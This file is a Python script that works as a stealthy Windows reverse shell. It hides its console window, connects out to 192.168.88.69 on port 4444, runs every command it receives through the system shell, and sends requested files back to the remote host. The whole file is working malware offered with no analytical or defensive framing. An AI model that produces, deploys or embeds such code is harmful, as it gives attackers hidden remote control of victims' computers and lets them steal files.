import socket
import subprocess
import os
import win32gui
import win32con
import base64

def hide_console():
    hwnd = win32gui.GetForegroundWindow()
    win32gui.ShowWindow(hwnd, win32con.SW_HIDE)

hide_console()

SERVER = "192.168.88.69"
PORT = 4444

s = socket.socket()
s.connect((SERVER, PORT))
msg = s.recv(1024).decode()

# Initialize the current working directory
current_dir = os.getcwd()

while True:
    try:
        cmd = s.recv(1024).decode()
        if cmd.lower() in ['q', 'quit', 'x', 'exit']:
            break

        # Check if the command is a directory change command
        if cmd.startswith('cd '):
            new_dir = cmd[3:]
            try:
                os.chdir(new_dir)
                current_dir = os.getcwd()
                result = f'[+] Changed directory to {current_dir}'.encode()
            except Exception as e:
                result = str(e).encode()
        elif cmd.startswith('put '):
            file_path = cmd[4:]
            try:
                with open(file_path, 'rb') as f:
                    file_data = f.read()
                file_size = len(file_data)
                s.sendall(f'{file_size}'.encode())
                s.recv(1024)  # Acknowledge receipt of file size
                s.sendall(file_data)
                result = '[+] File sent successfully'.encode()
            except Exception as e:
                result = str(e).encode()
        else:
            try:
                result = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True, cwd=current_dir)
            except Exception as e:
                result = str(e).encode()

        if len(result) == 0:
            result = '[+] Executed'.encode()

        s.sendall(result)
    except Exception as e:
        print(f'[!] Error: {e}')
        result = str(e).encode()
        s.sendall(result)

s.close()
